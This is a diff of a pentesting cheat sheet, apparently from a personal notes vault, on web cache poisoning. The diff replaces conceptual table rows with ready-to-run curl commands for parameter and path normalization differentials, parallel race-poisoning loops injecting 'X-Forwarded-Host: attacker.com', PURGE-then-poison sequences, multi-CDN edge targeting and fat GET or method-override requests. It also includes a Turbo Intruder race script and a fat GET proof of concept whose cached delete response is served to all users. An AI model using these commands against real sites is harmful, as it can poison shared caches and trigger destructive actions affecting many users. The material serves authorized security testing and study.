@@ -24,18 +24,14 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Cache puede normalizar cache key (e.g. lowercase URL, sort query params). Diferencias entre normalización del cache vs backend → poisoning. | Differential normalization. |
-| Param order | `?b=2&a=1` vs `?a=1&b=2` | Cache trata mismo, backend distinto (o viceversa). |
-| Param case | `?Foo=1` vs `?foo=1` | Backend case-insensitive, cache no. |
-| Param duplicate | `?a=1&a=2` | Cache toma uno, backend toma otro. |
-| Empty value | `?a=&b=2` vs `?b=2` | Cache trata distinto. |
-| Path case | `/PAGE` vs `/page` | Igual idea. |
-| Trailing slash | `/page/` vs `/page` | Cache normaliza? |
-| Query string fragments | `?#xyz` vs `?` (fragment NO se envía) | Cache may include el `#`. |
-| Encoded vs unencoded | `?a=hello%20world` vs `?a=hello world` | Edge case. |
-| Cache with custom params | App custom param ignored by cache | Specific config. |
-| Vary `Accept-Encoding` | Different encodings → distinct cache slots | gzip vs br vs identity. |
-| Vary `Accept-Language` | Multi-lingual cache | i18n. |
+| `curl -sI "https://target/page?a=1&b=2&cb=$RANDOM"` y `curl -sI "https://target/page?b=2&a=1&cb=$RANDOM"` | Param order differential cache key | Cache string-based vs sorted. |
+| `curl -sI "https://target/page?A=1&cb=$RANDOM"` y `curl -sI "https://target/page?a=1&cb=$RANDOM"` | Param case differential | Backend case-insensitive, cache no. |
+| `curl -sI "https://target/page?a=1&a=2&cb=$RANDOM"` | Duplicate param cache key | Backend HPP. |
+| `curl -sI "https://target/page?a=&cb=$RANDOM"` | Empty value handling | Cache distinto, backend igual. |
+| `curl -sI "https://target/PAGE?cb=$RANDOM"` y `curl -sI "https://target/page?cb=$RANDOM"` | Path case sensitivity | Backend lowercase, cache no. |
+| `curl -sI "https://target/page/?cb=$RANDOM"` y `curl -sI "https://target/page?cb=$RANDOM"` | Trailing slash differential | Cache normaliza? |
+| `curl -sI -H "Accept-Encoding: gzip" "https://target/?cb=$RANDOM"` y `curl -sI -H "Accept-Encoding: br" "https://target/?cb=$RANDOM"` | Vary `Accept-Encoding` distinct cache slots | Encoding-aware cache. |
+| `curl -sI -H "Accept-Language: es" "https://target/?cb=$RANDOM"` y `curl -sI -H "Accept-Language: en" "https://target/?cb=$RANDOM"` | Vary `Accept-Language` cache | i18n-aware cache. |
 ^wcp-bypass-normalization
 
 ### Discover normalization quirks
@@ -43,22 +39,16 @@ linked:
 ```bash
 URL="https://target/page"
 
-# Test param order
-for combo in "?a=1&b=2" "?b=2&a=1"; do
+for combo in "?a=1&b=2" "?b=2&a=1" "?A=1&B=2" "?a=1&a=2" "?a=&b=2"; do
   CB="cb=$(date +%s%N)"
-  curl -sI "${URL}${combo}&${CB}" | grep -i x-cache
+  echo "=== $combo ==="
+  curl -sI "${URL}${combo}&${CB}" | grep -iE 'x-cache|age:'
 done
 
-# Test case
-for c in "?A=1" "?a=1"; do
-  CB="cb=$(date +%s%N)"
-  curl -sI "${URL}${c}&${CB}" | grep -i x-cache
-done
-
-# Test trailing slash
-for s in "/page" "/page/"; do
+for s in "/page" "/page/" "/PAGE"; do
   CB="?cb=$(date +%s%N)"
-  curl -sI "https://target${s}${CB}" | grep -i x-cache
+  echo "=== $s ==="
+  curl -sI "https://target${s}${CB}" | grep -iE 'x-cache|age:'
 done
 ```
 
@@ -68,16 +58,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Window entre cache miss y cache fill — atacante puede slip request entre que origin genera y cache stores | Timing-sensitive. |
-| Single-flight bypass | Cache que serializes requests al origin (lock) — race entre lock acquire | Edge. |
-| Cache stampede | Multiple cache misses simultáneos al expirar TTL → backend overload | Performance + opportunity. |
-| Race poison | Mientras cache fill in progress, atacante manda poisoned request → wins race | Specific timing. |
-| Combine con HRS | HRS + cache fill window → pollute durante fill | Compuesto. |
-| Async cache update | Cache que valida en background — race en el update | Edge. |
-| Pre-warm exploit | Force cache miss + race con poison antes de victim hit | Multi-step. |
-| Turbo Intruder timing | Burp turbo + scripts para race timing | Tooling. |
-| Cache validation race | If-Modified-Since header race | Conditional GET. |
-| Distributed cache eventual consistency | Multi-node race | Edge case. |
+| Turbo Intruder script con `concurrentConnections=20`: queue poison_req + N legit_req | Race window cache fill — poison wins | Cache fill window. |
+| `for i in {1..100}; do curl -sH "X-Forwarded-Host: attacker.com" "https://target/?cb=$KEY" & done; wait` | Bash parallel race poison | Cache stampede attempt. |
+| Burp Repeater group "Send in parallel" con poison + N legit | Single-connection HTTP/2 race | H2 single-packet timing. |
+| `curl -X PURGE "https://target/page" && curl -H "X-Forwarded-Host: attacker" "https://target/page"` (race entre PURGE y poison) | Force invalidate + race poison fill | PURGE window. |
+| Trigger cache TTL expire + flood concurrent: monitor `Age:` header → flood at expiry | Race fill window post-TTL | Stampede vector. |
+| `If-Modified-Since: <past>` + concurrent poison | Conditional GET race | Cache validation race. |
 ^wcp-bypass-race
 
 ### Turbo Intruder cache race
@@ -99,7 +85,6 @@ Host: target.com
 
 '''
 
-    # Race: legit fills cache, poison wins
     engine.queue(poison_req)
     for _ in range(50):
         engine.queue(legit_req)
@@ -111,16 +96,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | App con Cloudflare → Akamai → origin. Cada cache normaliza distinto → diferenciales acumulables. | Multi-tier discrepancies. |
-| Detect multi-tier | Headers `Via:`, `X-Cache-*` con múltiples valores | Indicador. |
-| Mixed normalization | CF lowercase URL, Akamai no | Different keys per tier. |
-| Edge node selection | Geographic CDN edges | Per-region poison. |
-| Stale-while-revalidate chains | Multiple staleness layers | Complex. |
-| Cookie strip varies | One CDN strips cookies, otro no | Mixed cache key. |
-| Header strip varies | Custom headers strip in one tier | Differential. |
-| Full chain attack | Poison Cloudflare cache → it serves to Akamai → poisons Akamai too | Cascading. |
-| Subdomain CDN switch | `static.target.com` (CF) vs `target.com` (Akamai) | Different config. |
-| Combine con DNS rebinding | Force resolve to specific edge | Advanced. |
+| `curl -sI https://target/ \| grep -iE 'via:\|x-cache\|cf-cache\|x-akamai'` | Identificar CDN tiers (Via header + cache headers) | Pre-attack recon. |
+| `curl -sI https://target/PAGE?cb=$RANDOM` y `curl -sI https://target/page?cb=$RANDOM` | Detect tier-specific case normalization | Differential tier-by-tier. |
+| `curl -sI -H "Cookie: x=1" "https://target/?cb=$RANDOM"` y `curl -sI "https://target/?cb=$RANDOM"` | Cookie strip per-tier | One CDN strip, otro no. |
+| `dig +short target.com` y comparar con `dig +short target.com @1.1.1.1` (different resolver) | Geographic CDN edge selection | Per-region poisoning. |
+| `curl --resolve target.com:443:<EDGE_IP> https://target/?cb=$RANDOM` (force specific edge) | Force resolve a edge node específico | Per-edge testing. |
+| Poison primer tier (CF) → segundo tier (Akamai) lo sirve → cascada | Cascading multi-tier poison | Si tiers se servir entre sí. |
+| `curl -sI -H "X-Forwarded-Host: x" "https://static.target.com/?cb=$RANDOM"` y same en `target.com` | Subdomain CDN switch (CF static, Akamai apex) | Different per-subdomain config. |
 ^wcp-bypass-multicdn
 
 ___
@@ -129,16 +111,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Fat GET | GET con body — ambiguo, RFC permite pero no fomenta | Cache may ignore body, backend processes. |
-| Fat GET poison | `GET /page HTTP/1.1\r\nHost: target\r\nContent-Length: 22\r\n\r\nuser=admin&action=evil` | Cache key = URL only, backend processes body. |
-| POST con cache header forced | `POST /page` con `Cache-Control: public, max-age=3600` | Backend may respect header → cache POST response. |
-| POST cache vector | App acepta POST con form-urlencoded body | Common con forms. |
-| HEAD response cached as GET | Cache cachea HEAD response, sirve a GET request subsequent | HEAD/GET cache pollution. |
-| TRACE method abuse | TRACE method response cached | Edge. |
-| Chunked Transfer-Encoding cached | Body chunked → cache may cache differently | Combo HRS. |
-| OPTIONS cached | OPTIONS preflight cached as actual request | CORS edge. |
-| HTTP/2 frame poisoning | H2-specific frame ordering races | Modern. |
-| Combine con method override | `_method=GET` en POST | Multi-vector. |
+| `curl -X GET -H "Content-Length: 22" --data-binary "user=admin&action=del" "https://target/admin/x?cb=$RANDOM"` | Fat GET — body procesado por backend, cache key = URL only | Backend procesa body. |
+| `curl -X POST -H "Cache-Control: public, max-age=3600" -d "action=x" "https://target/?cb=$RANDOM"` | POST con header forzando cache | Backend respeta C-C header. |
+| `curl -I "https://target/?cb=$RANDOM"` (HEAD) y `curl "https://target/?cb=$KEY"` (GET subsequent) | HEAD response cached, sirve a GET subsequent | HEAD/GET pollution. |
+| `curl -X TRACE "https://target/?cb=$RANDOM"` | TRACE response cached | Edge legacy. |
+| `curl -X OPTIONS -H "Origin: attacker.com" "https://target/api/?cb=$RANDOM"` | OPTIONS preflight cached | CORS preflight cache. |
+| `curl -X POST -d "_method=GET&action=x" "https://target/?cb=$RANDOM"` | Method override + cache combo | Backend GET, cache POST. |
+| `curl -X POST -H "Transfer-Encoding: chunked" --data-binary $'5\r\nhello\r\n0\r\n\r\n' "https://target/?cb=$RANDOM"` | Chunked TE + cache | HRS adjacent. |
 ^wcp-bypass-fat
 
 ### Fat GET PoC
@@ -152,6 +131,6 @@ Cache-Control: public, max-age=3600
 action=delete&id=1
 ```
 
-Cache treats as standard GET (ignores body). Backend processes body como POST → ejecuta delete. Response (DELETE confirmation) cached como `/admin/user-data` para todos los users.
+Cache treats as standard GET (ignores body). Backend procesa body como form-urlencoded → ejecuta delete. Response cached como `/admin/user-data` para todos los users.
 
 ***
